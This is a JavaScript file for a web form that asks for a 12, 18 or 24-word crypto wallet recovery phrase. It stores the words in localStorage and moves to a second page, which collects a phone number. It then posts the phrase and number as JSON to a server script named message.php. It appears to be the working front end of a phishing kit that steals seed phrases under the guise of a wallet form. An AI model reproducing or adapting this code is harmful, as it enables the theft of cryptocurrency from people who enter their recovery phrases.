const button12Words = document.getElementById('12Words');
const button18Words = document.getElementById('18Words');
const button24Words = document.getElementById('24Words');
const openButton = document.getElementById('open');
const mainForm = document.getElementById('mainForm');
// const form12Words = document.forms('form12Words');
// const form18Words = document.forms('form18Words');
// const form24Words = document.forms('form24Words');
const form12WordsStyle = document.getElementById('form12Words');
const form18WordsStyle = document.getElementById('form18Words');
const form24WordsStyle = document.getElementById('form24Words');
const leftContent = document.getElementById('leftContent');
const telForm = document.getElementById('telForm');
const telInput = document.getElementById('tel');


var openStatus = {open: false};
openButton.onclick = () => {
    if(openStatus.open == false) {
        mainForm.style.animationName = 'formOpen';
        openStatus.open = true;
    }else {
        mainForm.style.animationName = 'formClose';
        openStatus.open = false;
    }
}

button12Words.onmousedown = () => {
    button12Words.style.border = '2px #5cb85c solid'
}

button18Words.onmousedown = () => {
    button18Words.style.border = '2px #5cb85c solid'
}

button24Words.onmousedown = () => {
    button24Words.style.border = '2px #5cb85c solid'
}

button12Words.onclick = () => {
    button12Words.style.backgroundColor = '#5cb85c'
    button12Words.style.color = 'white' 
    button12Words.style.border = '2px #5cb85c solid'

    button18Words.style.backgroundColor = 'white';
    button18Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button18Words.style.color = 'black'

    button24Words.style.backgroundColor = 'white';
    button24Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button24Words.style.color = 'black'

    form12WordsStyle.style.display = 'flex';
    form18WordsStyle.style.display = 'none';
    form24WordsStyle.style.display = 'none';
}

button18Words.onclick = () => {
    button18Words.style.backgroundColor = '#5cb85c'
    button18Words.style.color = 'white'
    button18Words.style.border = '2px #5cb85c solid'

    button12Words.style.backgroundColor = 'white';
    button12Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button12Words.style.color = 'black'

    button24Words.style.backgroundColor = 'white';
    button24Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button24Words.style.color = 'black'

    form12WordsStyle.style.display = 'none';
    form18WordsStyle.style.display = 'flex';
    form24WordsStyle.style.display = 'none';
}

button24Words.onclick = () => {
    button24Words.style.backgroundColor = '#5cb85c'
    button24Words.style.color = 'white'
    button24Words.style.border = '2px #5cb85c solid'

    button12Words.style.backgroundColor = 'white';
    button12Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button12Words.style.color = 'black'

    button18Words.style.backgroundColor = 'white';
    button18Words.style.border = '2px rgba(0, 0, 0, 0.137) solid'
    button18Words.style.color = 'black'

    form12WordsStyle.style.display = 'none';
    form18WordsStyle.style.display = 'none';
    form24WordsStyle.style.display = 'flex';
}


var formValues = {};

function saveValues(event, form) {
    event.preventDefault();
    const formId = form.id;

    const targetForm = Array.from(document.querySelectorAll(`#${formId} input`));
    for (let i of targetForm) {
        formValues[i.name] = i.value;
    }

    localStorage.setItem('formValues', JSON.stringify(formValues));
    window.location.href = "index2.html";
}

function postValues(event) {
    event.preventDefault();
    const formValues = JSON.parse(localStorage.getItem('formValues'));
    const telValue = telInput.value;
    formValues.tel = telValue;

    fetch('message.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formValues)
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.text();
      })
      .then(data => {
        console.log('Response from server:', data);
      })
      .catch(error => {
        console.error('Error sending data to server:', error);
      });
}


